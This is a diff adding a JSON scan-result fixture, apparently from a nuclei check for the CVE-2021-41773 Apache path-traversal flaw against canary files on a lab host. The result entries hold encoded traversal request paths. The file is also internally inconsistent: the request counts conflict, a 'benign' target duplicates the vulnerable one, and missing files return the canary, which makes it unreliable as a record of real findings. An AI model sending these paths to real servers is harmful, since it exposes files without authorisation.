@@ -1,0 +1,75 @@
+{
+  "check_id": "cve-2021-41773-traversal",
+  "check_pack_sha256": "0000000000000000000000000000000000000000000000000000000000000000",
+  "errors": [],
+  "request_cap": 4,
+  "requests_sent": 4,
+  "schema_version": "2.0",
+  "targets": [
+    {
+      "address": "10.114.59.90",
+      "answered": true,
+      "port": 8091,
+      "requests": [
+        {
+          "body_sha256": "9152cfa8b7e5a564f9f440387cfd585127ffcc70a958b31f45ce434d78272c03",
+          "path": "/static/.%2e/.%2e/srv/canary/canary.txt",
+          "status": 200,
+          "tokens": [
+            "AEGIS-CANARY-0123456789abcdef0123456789abcdef"
+          ]
+        },
+        {
+          "body_sha256": "9152cfa8b7e5a564f9f440387cfd585127ffcc70a958b31f45ce434d78272c03",
+          "path": "/static/.%2e/.%2e/srv/canary/absent.txt",
+          "status": 200,
+          "tokens": [
+            "AEGIS-CANARY-0123456789abcdef0123456789abcdef"
+          ]
+        }
+      ],
+      "role": "positive"
+    },
+    {
+      "address": "10.114.59.90",
+      "answered": true,
+      "port": 8090,
+      "requests": [
+        {
+          "body_sha256": "dc51b8c96c2d745df3bd5590d990230a482fd247123599548e0632fdbf97fc22",
+          "path": "/static/.%2e/.%2e/srv/canary/canary.txt",
+          "status": 200,
+          "tokens": []
+        },
+        {
+          "body_sha256": "dc51b8c96c2d745df3bd5590d990230a482fd247123599548e0632fdbf97fc22",
+          "path": "/static/.%2e/.%2e/srv/canary/absent.txt",
+          "status": 200,
+          "tokens": []
+        }
+      ],
+      "role": "patched_twin"
+    },
+    {
+      "address": "10.114.59.90",
+      "answered": true,
+      "port": 8091,
+      "requests": [
+        {
+          "body_sha256": "9152cfa8b7e5a564f9f440387cfd585127ffcc70a958b31f45ce434d78272c03",
+          "path": "/static/.%2e/.%2e/srv/canary/absent.txt",
+          "status": 200,
+          "tokens": [
+            "AEGIS-CANARY-0123456789abcdef0123456789abcdef"
+          ]
+        }
+      ],
+      "role": "benign"
+    }
+  ],
+  "tool": {
+    "image_digest": "sha256:5555555555555555555555555555555555555555555555555555555555555555",
+    "name": "nuclei",
+    "version": "v3.11.1"
+  }
+}
